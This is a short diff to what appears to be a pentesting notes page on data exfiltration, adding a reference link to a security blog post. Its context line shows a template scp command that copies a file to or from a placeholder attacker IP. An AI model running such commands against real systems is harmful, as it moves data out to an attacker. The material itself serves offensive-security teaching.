@@ -170,5 +170,6 @@ scp <username>@<Attacker_IP>:<directory>/<filename>
 ## References
 
 * [https://azeria-labs.com/data-exfiltration/](https://azeria-labs.com/data-exfiltration/)
+* [https://www.pentestpartners.com/security-blog/data-exfiltration-techniques/](https://www.pentestpartners.com/security-blog/data-exfiltration-techniques/)
 
 If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
